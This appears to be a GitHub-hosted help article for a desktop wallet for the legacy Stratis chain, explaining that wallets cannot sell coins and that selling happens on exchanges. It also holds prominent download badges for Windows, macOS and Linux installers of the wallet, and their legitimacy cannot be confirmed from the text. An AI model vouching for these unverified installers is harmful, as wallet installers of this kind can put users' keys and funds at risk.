![Electrum-Stratis](assets/banner-article.png)

# "How do I sell Bitcoin from Electrum?" - this wallet cannot, and neither can a wallet

<p align="center">Selling is an exchange function</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Selling is an exchange function, not a wallet function. A wallet holds keys and signs transactions; it has no order book, no buyer, no price and no way to deliver fiat. Electrum Stratis holds legacy STRAT rather than bitcoin, so the question has two answers stacked on top of each other: this wallet cannot sell anything, and no wallet sells bitcoin by itself. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you want | What a wallet does | What actually does it |
|---|---|---|
| Convert coins to fiat | Signs a send | An exchange or broker |
| Find a price | Nothing | A market venue |
| Receive payment | Shows an address | The payer's wallet |
| Swap one asset for another | Nothing | A venue or a counterparty |
| Cash out privately | Nothing | Depends on the venue's rules |

</div>

The wallet's role ends where the counterparty begins, and that boundary is deliberate: a wallet that could sell would be holding your coins and someone else's money at the same time.

## Why it happens

The confusion is linguistic. Wallets show balances in currency, so they look like accounts with money in them; exchanges show order forms, so they look like the place where the money lives. In reality the wallet holds a quantity of an asset, and the currency figure is a reference price supplied by the interface or by a market site, not a balance you can withdraw.

The second layer is the chain. This wallet serves the legacy Stratis chain, so the asset it holds is STRAT, not bitcoin and not STRAX. A question about selling bitcoin is not a question this wallet can answer even in principle, because it has never held bitcoin. The Bitcoin wallet with a similar name has the same limitation for a different reason: it holds bitcoin, and it still cannot sell it.

The third layer is regulatory. Selling for fiat requires an entity that can hold customer funds, apply identity checks and settle a bank transfer. That is a business, not a feature, and no amount of wallet development turns a key manager into one.

## Fix

1. **Separate the two questions.** Which asset do you hold, and where can it be sold? The first is answered by the wallet; the second by a venue that lists the asset.
2. **Confirm the asset before looking for a market.** Legacy STRAT is not bitcoin and not STRAX. A venue that lists one of those does not necessarily list this one.
3. **Choose a venue deliberately.** An exchange account means the venue holds the coins until you withdraw, and it means identity checks and a terms-of-service relationship. That is the cost of a counterparty.
4. **Move only what you intend to sell.** Sending the whole balance to a venue concentrates risk in an account you do not control; send the amount you plan to trade.
5. **Keep the wallet as the long-term home.** The venue is for the sale; the keys stay with you for everything you are not selling.
6. **Record the transaction.** A sale produces a taxable event in many jurisdictions, and the venue's export is easier to use than a reconstruction later.

There is no setting in this wallet that adds selling, and no plugin that turns it into an exchange. What it offers is custody, which is the part a venue cannot give you; the build that does this is the current one on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19). [what Electrum Stratis keys and addresses expose](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-a-thief-can-actually-take.md) and [Electrum Stratis wallet types](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md) are the two distinctions that make the rest of this obvious.

## If that did not work

If a site offers to sell your coins directly from a wallet connection, it is asking for a signature or a key. A signature can authorise a transfer; a key hands over everything.

If a venue refuses a legacy deposit, that is its policy, not a fault in your wallet. The coins remain yours, and the venue simply will not credit them.

If you cannot find any venue that lists the asset, the honest conclusion is that there is no market at that venue - not that the coins are invalid. Custody and liquidity are different problems, and only the first one is yours to solve with a wallet.

## Prevention

- Do not expect a wallet to sell anything.
- Confirm the asset and the chain before sending to a venue.
- Send only the amount you intend to trade.
- Keep the seed and the long-term balance offline.
- Treat "sell from your wallet" offers as phishing until proven otherwise.
- Confirm the asset and the venue before moving coins; a wallet cannot undo a deposit sent to the wrong place.

## FAQ

### Can I sell Bitcoin from Electrum?

No. Electrum is a wallet: it signs transactions and holds keys. Selling requires a venue with a buyer and a settlement method, and a wallet has neither.

### Can this wallet sell my STRAT?

No. It has no exchange, no order book and no fiat rail. It holds and moves the legacy asset, and selling happens somewhere else.

### Where can I sell legacy STRAT?

Only where a venue lists it, and most do not. That is a market fact rather than a wallet limitation, and no tool can create a buyer.

### Is it safe to connect my wallet to a selling site?

Treat any site that asks to connect a wallet as a request for authority over it. A legitimate sale moves coins to a venue's deposit address; it does not need a signature from your wallet beyond the transfer itself.

<!-- DOWNLOAD-BLOCK -->

Selling starts with custody, not with an exchange. Coins held on this chain are not on a Bitcoin venue, so there is nothing to sell until they are somewhere the venue accepts. Decide which asset you actually hold, where it can legally be deposited, and what that venue charges, before moving anything. A wallet cannot reverse a deposit sent to the wrong network.

## Related articles

- [Electrum alternatives, sorted by what you need](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/alternatives-by-category.md)
- [Why every price you see is quoted in STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-prices-are-quoted-in-strax.md)
- [Does Stratis work only on STRAX now?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/does-the-legacy-chain-still-run.md)
- [The scam variants aimed at wallet holders](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/scams-that-promise-funds-back.md)
